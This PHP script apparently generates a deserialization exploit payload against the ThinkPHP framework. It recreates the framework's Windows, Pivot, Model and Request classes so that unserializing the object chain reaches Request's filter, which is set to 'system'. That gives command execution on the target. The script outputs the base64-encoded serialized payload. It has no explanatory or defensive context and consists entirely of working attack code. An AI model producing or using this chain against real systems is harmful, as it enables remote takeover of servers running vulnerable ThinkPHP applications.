<?php
namespace think;
class Request
{
    protected $hook = [];
    protected $filter = "system";
    protected $config = [
        // 表单请求类型伪装变量
        'var_method'       => '_method',
        // 表单ajax伪装变量
        'var_ajax'         => '_ajax',
        // 表单pjax伪装变量
        'var_pjax'         => '_pjax',
        // PATHINFO变量名 用于兼容模式
        'var_pathinfo'     => 's',
        // 兼容PATH_INFO获取
        'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
        // 默认全局过滤方法 用逗号分隔多个
        'default_filter'   => '',
        // 域名根，如thinkphp.cn
        'url_domain_root'  => '',
        // HTTPS代理标识
        'https_agent_name' => '',
        // IP代理获取标识
        'http_agent_ip'    => 'HTTP_X_REAL_IP',
        // URL伪静态后缀
        'url_html_suffix'  => 'html',
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = ["var_ajax"=>'huha'];
        $this->hook = ["visible"=>[$this,"isAjax"]];
    }
}


abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
    	# append键必须存在，并且与$this->data相同
        $this->append = ["huha"=>[]];
        $this->data = ["huha"=>new Request()];
    }
}

namespace think\model;

use think\Model;

class Pivot extends Model
{
}

namespace think\process\pipes;
use think\model\Pivot;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
//var_dump(new Windows());
echo base64_encode(serialize(new Windows()));
?>